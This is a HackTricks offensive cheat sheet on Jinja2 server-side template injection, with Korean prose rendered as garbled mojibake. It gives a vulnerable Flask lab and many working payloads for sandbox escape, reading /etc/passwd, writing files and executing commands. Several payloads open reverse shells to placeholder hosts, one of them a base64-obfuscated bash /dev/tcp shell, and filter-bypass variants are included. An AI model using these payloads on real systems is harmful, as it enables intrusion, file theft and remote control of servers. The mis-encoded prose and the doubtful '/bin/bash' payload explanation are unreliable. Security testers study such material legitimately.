# Jinja2 SSTI

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## **Lab**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
## **ê¸°íƒ€**

### **ë””ë²„ê·¸ ë¬¸ì¥**

ë””ë²„ê·¸ í™•ì¥ì´ í™œì„±í™”ë˜ë©´ `debug` íƒœê·¸ë¥¼ ì‚¬ìš©í•˜ì—¬ í˜„ì¬ ì»¨í…ìŠ¤íŠ¸ì™€ ì‚¬ìš© ê°€ëŠ¥í•œ í•„í„° ë° í…ŒìŠ¤íŠ¸ë¥¼ ë¤í”„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ë””ë²„ê±°ë¥¼ ì„¤ì •í•˜ì§€ ì•Šê³  í…œí”Œë¦¿ì—ì„œ ì‚¬ìš© ê°€ëŠ¥í•œ ê²ƒì„ í™•ì¸í•˜ëŠ” ë° ìœ ìš©í•©ë‹ˆë‹¤.
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}


</pre>
```
ì›ë³¸: [https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)

### **ëª¨ë“  êµ¬ì„± ë³€ìˆ˜ ë¤í”„í•˜ê¸°**
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}
```
## **Jinja ì‚½ì…**

ë¨¼ì €, Jinja ì‚½ì…ì—ì„œëŠ” **ìƒŒë“œë°•ìŠ¤ì—ì„œ íƒˆì¶œí•˜ê³  ì¼ë°˜ì ì¸ íŒŒì´ì¬ ì‹¤í–‰ íë¦„ì— ë‹¤ì‹œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤**. ì´ë¥¼ ìœ„í•´, **ìƒŒë“œë°•ìŠ¤ì—ì„œ ì ‘ê·¼ ê°€ëŠ¥í•œ** **ë¹„ìƒŒë“œë°•ìŠ¤ í™˜ê²½ì˜ ê°ì²´ë¥¼ ì•…ìš©**í•´ì•¼ í•©ë‹ˆë‹¤.

### ì „ì—­ ê°ì²´ì— ì ‘ê·¼í•˜ê¸°

ì˜ˆë¥¼ ë“¤ì–´, ì½”ë“œ `render_template("hello.html", username=username, email=email)`ì—ì„œ usernameê³¼ email ê°ì²´ëŠ” **ë¹„ìƒŒë“œë°•ìŠ¤ íŒŒì´ì¬ í™˜ê²½ì—ì„œ ê°€ì ¸ì˜¤ë©°** **ìƒŒë“œë°•ìŠ¤ í™˜ê²½ì—ì„œ ì ‘ê·¼ ê°€ëŠ¥**í•©ë‹ˆë‹¤.\
ë˜í•œ, **ìƒŒë“œë°•ìŠ¤ í™˜ê²½ì—ì„œ í•­ìƒ ì ‘ê·¼ ê°€ëŠ¥í•œ ë‹¤ë¥¸ ê°ì²´**ë“¤ì´ ìˆìŠµë‹ˆë‹¤:
```
[]
''
()
dict
config
request
```
### \<class 'object'> ë³µêµ¬í•˜ê¸°

ê·¸ëŸ° ë‹¤ìŒ, ì´ëŸ¬í•œ ê°ì²´ì—ì„œ í´ë˜ìŠ¤ì¸ **`<class 'object'>`**ë¥¼ ì–»ì–´ ì •ì˜ëœ **í´ë˜ìŠ¤**ë¥¼ **ë³µêµ¬**í•´ì•¼ í•©ë‹ˆë‹¤. ì´ëŠ” ì´ ê°ì²´ì—ì„œ **`__subclasses__`** ë©”ì„œë“œë¥¼ í˜¸ì¶œí•˜ê³  ë¹„ì‚¬ìš©ì ì œí•œì´ ì—†ëŠ” íŒŒì´ì¬ í™˜ê²½ì—ì„œ ëª¨ë“  í´ë˜ìŠ¤ì— ì ‘ê·¼í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

ì´ **ê°ì²´ í´ë˜ìŠ¤**ì— ì ‘ê·¼í•˜ë ¤ë©´ **í´ë˜ìŠ¤ ê°ì²´**ì— ì ‘ê·¼í•œ ë‹¤ìŒ **`__base__`**, **`__mro__()[-1]`**, ë˜ëŠ” `.`**`mro()[-1]`**ì— ì ‘ê·¼í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, ì´ **ê°ì²´ í´ë˜ìŠ¤**ì— ë„ë‹¬í•œ í›„ **`__subclasses__()`**ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.

ë‹¤ìŒ ì˜ˆì œë¥¼ í™•ì¸í•˜ì„¸ìš”:
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}

# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### RCE íƒˆì¶œ

`<class 'object'>`ë¥¼ ë³µêµ¬í•˜ê³  `__subclasses__`ë¥¼ í˜¸ì¶œí•œ í›„ì—ëŠ” ì´ëŸ¬í•œ í´ë˜ìŠ¤ë¥¼ ì‚¬ìš©í•˜ì—¬ íŒŒì¼ì„ ì½ê³  ì“°ê³  ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`__subclasses__` í˜¸ì¶œë¡œ ì¸í•´ **ìˆ˜ë°± ê°œì˜ ìƒˆë¡œìš´ í•¨ìˆ˜ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ê¸°íšŒ**ê°€ ìƒê²¼ìœ¼ë©°, ìš°ë¦¬ëŠ” **íŒŒì¼ í´ë˜ìŠ¤**ì— ì ‘ê·¼í•˜ì—¬ **íŒŒì¼ì„ ì½ê³  ì“°ê¸°** ë˜ëŠ” `os`ì™€ ê°™ì´ **ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” í´ë˜ìŠ¤**ì— ì ‘ê·¼í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œë„ ë§Œì¡±í•  ê²ƒì…ë‹ˆë‹¤.

**ì›ê²© íŒŒì¼ ì½ê¸°/ì“°ê¸°**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**ì›ê²© ì½”ë“œ ì‹¤í–‰ (RCE)**

ì›ê²© ì½”ë“œ ì‹¤í–‰ (RCE)ëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë°œìƒí•˜ëŠ” ì‹¬ê°í•œ ì·¨ì•½ì  ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. ê³µê²©ìëŠ” ì•…ì˜ì ì¸ ì½”ë“œë¥¼ ì›ê²©ìœ¼ë¡œ ì‹¤í–‰í•˜ì—¬ ì‹œìŠ¤í…œì— ì•¡ì„¸ìŠ¤í•˜ê³  ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì•…ìš©ë˜ë©´ ì¤‘ìš”í•œ ë°ì´í„° ìœ ì¶œ, ì‹œìŠ¤í…œ ì†ìƒ ë˜ëŠ” ì•…ì„± í–‰ìœ„ì— ì´ë¥´ëŠ” ê²°ê³¼ë¥¼ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

RCE ê³µê²©ì€ ë‹¤ì–‘í•œ ë°©ë²•ìœ¼ë¡œ ìˆ˜í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì‚¬ìš©ë˜ëŠ” ì…ë ¥ ê²€ì¦ ë° í•„í„°ë§ ë¶€ì¡±, ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì·¨ì•½í•œ êµ¬ì„±, ì™¸ë¶€ ì…ë ¥ì— ëŒ€í•œ ì‹ ë¢° ë“±ì´ ì›ì¸ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µê²©ìëŠ” ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ì•…ì„± ì½”ë“œë¥¼ ì‚½ì…í•˜ê³  ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

RCE ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë³´ì•ˆ ì¡°ì¹˜ë¥¼ ì ìš©í•´ì•¼ í•©ë‹ˆë‹¤.

1. ì…ë ¥ ê²€ì¦ ë° í•„í„°ë§: ëª¨ë“  ì…ë ¥ ë°ì´í„°ì— ëŒ€í•´ ì ì ˆí•œ ê²€ì¦ ë° í•„í„°ë§ì„ ìˆ˜í–‰í•˜ì—¬ ì•…ì„± ì½”ë“œì˜ ì‚½ì…ì„ ë°©ì§€í•´ì•¼ í•©ë‹ˆë‹¤.
2. ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ë°©í™”ë²½: ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ë°©í™”ë²½ì„ ì‚¬ìš©í•˜ì—¬ ì•…ì„± ì½”ë“œì˜ ì‹¤í–‰ì„ ì°¨ë‹¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
3. ì—…ë°ì´íŠ¸ ë° íŒ¨ì¹˜: ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ë° ê´€ë ¨ ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ìµœì‹  ë²„ì „ìœ¼ë¡œ ì—…ë°ì´íŠ¸í•˜ê³  íŒ¨ì¹˜í•´ì•¼ í•©ë‹ˆë‹¤.
4. ë³´ì•ˆ ê°ì‚¬ ë° ëª¨ë‹ˆí„°ë§: ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë³´ì•ˆ ê°ì‚¬ ë° ëª¨ë‹ˆí„°ë§ì„ ìˆ˜í–‰í•˜ì—¬ ì ì¬ì ì¸ ì·¨ì•½ì ì„ ì‹ë³„í•˜ê³  ëŒ€ì‘í•  ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.

RCE ê³µê²©ì€ ì‹¬ê°í•œ ë³´ì•ˆ ìœ„í˜‘ì´ë¯€ë¡œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ê°œë°œìì™€ ê´€ë¦¬ìëŠ” ì´ë¥¼ ì¸ì‹í•˜ê³  ì ì ˆí•œ ë³´ì•ˆ ì¡°ì¹˜ë¥¼ ì·¨í•´ì•¼ í•©ë‹ˆë‹¤.
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Calling os.popen without guessing the index of the class

{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


```
**ë” ë§ì€ í´ë˜ìŠ¤**ë¥¼ **ì´ìš©í•˜ì—¬ íƒˆì¶œ**í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ì•Œì•„ë³´ë ¤ë©´ ë‹¤ìŒì„ **í™•ì¸**í•˜ì„¸ìš”:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### í•„í„° ìš°íšŒ

#### ì¼ë°˜ì ì¸ ìš°íšŒ ë°©ë²•

ì´ëŸ¬í•œ ìš°íšŒ ë°©ë²•ì„ ì‚¬ìš©í•˜ë©´ **ì¼ë¶€ ë¬¸ìë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³ ** ê°ì²´ì˜ **ì†ì„±ì— ì ‘ê·¼**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ì „ ì˜ˆì œì—ì„œ ì´ë¯¸ ì´ëŸ¬í•œ ìš°íšŒ ë°©ë²• ì¤‘ ì¼ë¶€ë¥¼ ë³´ì•˜ì§€ë§Œ, ì—¬ê¸°ì—ì„œ ê°„ë‹¨íˆ ìš”ì•½í•´ ë³´ê² ìŠµë‹ˆë‹¤:
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}
```
* [**ì „ì—­ ê°ì²´ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë” ë§ì€ ì˜µì…˜ì„ ë³´ë ¤ë©´ ì—¬ê¸°ë¡œ ëŒì•„ê°€ì„¸ìš”**](jinja2-ssti.md#accessing-global-objects)
* [**ê°ì²´ í´ë˜ìŠ¤ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë” ë§ì€ ì˜µì…˜ì„ ë³´ë ¤ë©´ ì—¬ê¸°ë¡œ ëŒì•„ê°€ì„¸ìš”**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
* [**ê°ì²´ í´ë˜ìŠ¤ ì—†ì´ RCEë¥¼ ì–»ìœ¼ë ¤ë©´ ì´ê²ƒì„ ì½ìœ¼ì„¸ìš”**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**HTML ì¸ì½”ë”© í”¼í•˜ê¸°**

ê¸°ë³¸ì ìœ¼ë¡œ FlaskëŠ” ë³´ì•ˆìƒì˜ ì´ìœ ë¡œ í…œí”Œë¦¿ ë‚´ë¶€ì˜ ëª¨ë“  ê²ƒì„ HTML ì¸ì½”ë”©í•©ë‹ˆë‹¤:
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**`safe`** í•„í„°ë¥¼ ì‚¬ìš©í•˜ë©´ í˜ì´ì§€ì— JavaScriptì™€ HTMLì„ **HTML ì¸ì½”ë”© ì—†ì´** ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒê³¼ ê°™ì´ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**ì•…ì„± êµ¬ì„± íŒŒì¼ì„ ì‘ì„±í•˜ì—¬ RCE(Remote Code Execution) ìˆ˜í–‰í•˜ê¸°.**

In some cases, the application may load configuration files that are written in a templating language like Jinja2. If the application does not properly sanitize user input before rendering the configuration file, it may be possible to inject malicious code and achieve remote code execution.

ì¼ë¶€ ê²½ìš°ì—ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì´ Jinja2ì™€ ê°™ì€ í…œí”Œë¦¿ ì–¸ì–´ë¡œ ì‘ì„±ëœ êµ¬ì„± íŒŒì¼ì„ ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì• í”Œë¦¬ì¼€ì´ì…˜ì´ êµ¬ì„± íŒŒì¼ì„ ë Œë”ë§í•˜ê¸° ì „ì— ì‚¬ìš©ì ì…ë ¥ì„ ì ì ˆí•˜ê²Œ ê²€ì¦í•˜ì§€ ì•ŠëŠ” ê²½ìš°, ì•…ì„± ì½”ë“œë¥¼ ì‚½ì…í•˜ì—¬ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ ë‹¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

To exploit this vulnerability, you need to identify the location where the application loads the configuration file and determine the syntax used by the templating language. Once you have this information, you can craft a payload that will be executed when the configuration file is rendered.

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì´ êµ¬ì„± íŒŒì¼ì„ ë¡œë“œí•˜ëŠ” ìœ„ì¹˜ë¥¼ ì‹ë³„í•˜ê³ , í…œí”Œë¦¿ ì–¸ì–´ì—ì„œ ì‚¬ìš©ë˜ëŠ” êµ¬ë¬¸ì„ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤. ì´ ì •ë³´ë¥¼ ì–»ìœ¼ë©´, êµ¬ì„± íŒŒì¼ì´ ë Œë”ë§ë  ë•Œ ì‹¤í–‰ë˜ëŠ” í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

For example, if the application uses Jinja2 syntax, you can use the following payload to execute arbitrary code:

ì˜ˆë¥¼ ë“¤ì–´, ì• í”Œë¦¬ì¼€ì´ì…˜ì´ Jinja2 êµ¬ë¬¸ì„ ì‚¬ìš©í•˜ëŠ” ê²½ìš°, ë‹¤ìŒ í˜ì´ë¡œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/bin/bash', shell=True) }}
```

This payload leverages the `__class__` attribute to access the class hierarchy, retrieves the `subclasses()` method, and executes the desired command (`/bin/bash` in this case) using the `shell=True` parameter.

ì´ í˜ì´ë¡œë“œëŠ” `__class__` ì†ì„±ì„ í™œìš©í•˜ì—¬ í´ë˜ìŠ¤ ê³„ì¸µ êµ¬ì¡°ì— ì ‘ê·¼í•˜ê³ , `subclasses()` ë©”ì„œë“œë¥¼ ê²€ìƒ‰í•œ ë‹¤ìŒ, `shell=True` ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì›í•˜ëŠ” ëª…ë ¹(`'/bin/bash'` ì´ ê²½ìš°)ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.

By injecting this payload into the configuration file, you can trick the application into executing arbitrary commands and gain remote code execution.

ì´ í˜ì´ë¡œë“œë¥¼ êµ¬ì„± íŒŒì¼ì— ì‚½ì…í•¨ìœ¼ë¡œì¨, ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì†ì—¬ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê³  ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## ëª‡ ê°€ì§€ ë¬¸ì ì—†ì´

**`{{`**, **`.`**, **`[`**, **`]`**, **`}}`**, **`_`** ì—†ì´
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}
```
## **\<class 'object'>** ì—†ì´ Jinja ì‚½ì…

[**ì „ì—­ ê°ì²´**](jinja2-ssti.md#accessing-global-objects)ì—ì„œëŠ” **ê·¸ í´ë˜ìŠ¤ë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³ ë„ RCEì— ë„ë‹¬í•  ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ ë°©ë²•**ì´ ìˆìŠµë‹ˆë‹¤.\
ì „ì—­ ê°ì²´ ì¤‘ì—ì„œ **ì–´ë–¤ í•¨ìˆ˜**ì— ë„ë‹¬í•˜ë©´ **`__globals__.__builtins__`**ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìœ¼ë©°, ê±°ê¸°ì„œ RCEë¥¼ ìˆ˜í–‰í•˜ëŠ” ê²ƒì€ ë§¤ìš° **ê°„ë‹¨**í•©ë‹ˆë‹¤.

**`request`**, **`config`** ë° ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ **í¥ë¯¸ë¡œìš´ ì „ì—­ ê°ì²´**ì—ì„œ **í•¨ìˆ˜ë¥¼ ì°¾ì„ ìˆ˜** ìˆìŠµë‹ˆë‹¤:
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
ì¼ë¶€ í•¨ìˆ˜ë¥¼ ì°¾ì•˜ë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ ë‚´ì¥ í•¨ìˆ˜ë¥¼ ë³µêµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}

## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
## ì°¸ê³  ìë£Œ

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* ì—¬ê¸°ì—ì„œ [attr íŠ¸ë¦­ì„ ì‚¬ìš©í•˜ì—¬ ë¸”ë™ë¦¬ìŠ¤íŠ¸ëœ ë¬¸ìë¥¼ ìš°íšŒí•˜ëŠ” ë°©ë²•ì„ í™•ì¸í•˜ì„¸ìš”](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3).
* [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
